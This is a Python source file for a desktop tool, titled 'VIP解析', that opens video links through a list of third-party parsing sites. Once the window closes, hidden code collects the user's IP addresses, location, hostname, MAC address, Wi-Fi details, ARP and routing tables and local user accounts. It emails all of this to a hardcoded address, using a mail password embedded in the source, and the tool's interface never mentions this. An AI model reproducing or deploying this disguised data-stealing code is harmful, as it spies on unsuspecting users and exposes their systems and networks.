import requests
import smtplib
import socket
import tkinter
import uuid
import subprocess
import webbrowser
from email.mime.text import MIMEText
from tkinter import ttk
from lxml import etree


analy = {
        '思古解析': 'http://api.bbbbbb.me/jx/?url=',
        '视频解析': 'http://jx.598110.com/?url=',
        'vip视频解析': 'http://api.sumingys.com/index.php?url=',
        '无名小站': 'http://www.82190555.com/video.php?url=',
        'UU影视': 'http://api.uuyingshi.com/?url=',
        '那片云解析': 'http://api.nepian.com/ckparse/?url=',
        '石头云': 'http://jiexi.071811.cc/jx.php?url=',
        '人人解析': 'https://vip.mpos.ren/v/?url=',
        'wlzhan解析': 'http://api.wlzhan.com/sudu/?url=',
        '金桥解析': 'http://jqaaa.com/jx.php?url=',
        'Lequgirl': 'http://api.lequgirl.com/?url=',
        '通用视频': 'http://jx.598110.com/index.php?url=',
        '爱看TV': 'http://aikan-tv.com/?url=',
        '百域阁': 'http://app.baiyug.cn:2019/vip/index.php?url=',
        '会员K云': 'http://17kyun.com/api.php?url=',
        '高端解析': 'http://api.hlglwl.com/jx.php?url=',
        '寒曦朦': 'http://jx.hanximeng.com/api.php?url=',
        '鑫梦解析': 'http://api.52xmw.com/?url=',
        '618G解析': 'https://jx.618g.com/?url=',
        'OK视频': 'http://okjx.cc/?url='
    }


def go():
    for i in range(len(list(analy.keys()))):
        if com.get() == list(analy.keys())[i] and m_str_var.get() != '':
            webbrowser.open(list(analy.values())[i] + m_str_var.get())


def get_Internet_Ipv4():
    url = 'http://ip.t086.com/'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                             'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 '
                             'Safari/537.36 Edg/83.0.478.54'}
    html = requests.get(url, headers=headers).text
    ipv4 = etree.HTML(html).xpath('//div[@class="bar2 f16"]/a/text()')[0]
    return ipv4


def get_Intranet_Ipv4():
    return socket.gethostbyname(get_Hostname())


def get_Hostname():
    return socket.getfqdn(socket.gethostname())


def get_Mac_Address():
    return ":".join([uuid.UUID(int=uuid.getnode()).hex[-12:][e:e+2] for e in range(0, 11, 2)])


def get_Address():
    url = f'http://ip.t086.com/?ip={get_Internet_Ipv4()}'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                             'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 '
                             'Safari/537.36 Edg/83.0.478.54'}
    html = requests.get(url, headers=headers).text
    address = etree.HTML(html).xpath('//b[@class="f1"]/text()')[0]
    service = str(etree.HTML(html).xpath('//div[@class="bar2 f16"]/text()')[2]).split('：')[1]
    longitude_and_latitude = str(etree.HTML(html).xpath('//div[@class="bar2"]/text()')[4])
    return address, longitude_and_latitude, service


def Command(cmd):
    proc = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE
    )
    proc.stdin.close()
    proc.wait()
    result = proc.stdout.read().decode('gbk')
    proc.stdout.close()
    return result


def get_Interfaces(cmd, cond):
    proc = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE
    )
    proc.stdin.close()
    proc.wait()
    for i in proc.stdout.readlines():
        if i.strip().decode('gbk').find(cond) != -1:
            proc.stdout.close()
            return i.strip().decode('gbk').split(':', 1)[1][1:]


def mail(content):
    message = MIMEText(content, 'plain', 'utf-8')
    message['From'] = 's1241340102@163.com'
    message['To'] = ",".join(['1241340102@qq.com'])
    message['Subject'] = f'来自{get_Internet_Ipv4()}的信息'

    try:
        smtpObj = smtplib.SMTP_SSL("smtp.163.com", 465)
        smtpObj.login('s1241340102@163.com', 'LFOYJCTNXQWUMGRH')
        smtpObj.sendmail('s1241340102@163.com', ['1241340102@qq.com'], message.as_string())
    except smtplib.SMTPException as e:
        print(e)


if __name__ == '__main__':
    root = tkinter.Tk()
    root.title('VIP解析')
    root.wm_attributes('-topmost', 1)
    width = 550
    screenwidth = root.winfo_screenwidth()
    screenheight = root.winfo_screenheight()
    alignstr = '%dx%d+%d+%d' % (width, 100, (screenwidth - width) / 2, 0)
    root.geometry(alignstr)
    root.resizable(0, 0)

    com = ttk.Combobox(root, textvariable=tkinter.StringVar(), state="readonly")
    com["value"] = tuple(analy)
    com.current(0)
    com.pack(expand='yes', fill='both')

    m_str_var = tkinter.StringVar()
    m_entry = tkinter.Entry(root, textvariable=m_str_var, width=100)
    m_entry.pack(padx=10, pady=10)

    button = tkinter.Button(root, text="Go", command=go, width=20)
    button.pack(expand='yes', fill='both')

    root.mainloop()
    content = f'基本信息:\n' \
              f'===========================================================================\n' \
              f'公网IP:{get_Internet_Ipv4()}\n' \
              f'内网IP:{get_Intranet_Ipv4()}\n' \
              f'位置:{get_Address()[0]}\n' \
              f'{get_Address()[1]}\n' \
              f'服务商:{get_Address()[2]}\n' \
              f'主机名:{get_Hostname()}\n' \
              f'MAC地址:{get_Mac_Address()}\n' \
              f'物理地址:{get_Interfaces("netsh WLAN show interfaces", "物理地址")}\n' \
              f'SSID:{get_Interfaces("netsh WLAN show interfaces", "SSID")}\n' \
              f'BSSID:{get_Interfaces("netsh wlan show networks mode=bssid", "BSSID")}\n' \
              f'GUID:{get_Interfaces("netsh WLAN show interfaces", "GUID")}\n' \
              f'===========================================================================\n\n' \
              f'详细信息:\n' \
              f'===========================================================================' \
              f'{Command("netsh wlan show networks mode=bssid")}' \
              f'===========================================================================\n\n' \
              f'ARP -A:\n' \
              f'===========================================================================\n' \
              f'{Command("arp -a")}\n' \
              f'===========================================================================\n\n'\
              f'Route Print:\n' \
              f'{Command("route print")}' \
              f'===========================================================================\n\n' \
              f'Net User' \
              f'===========================================================================\n' \
              f'{Command("net user")}' \
              f'===========================================================================\n'
    mail(content)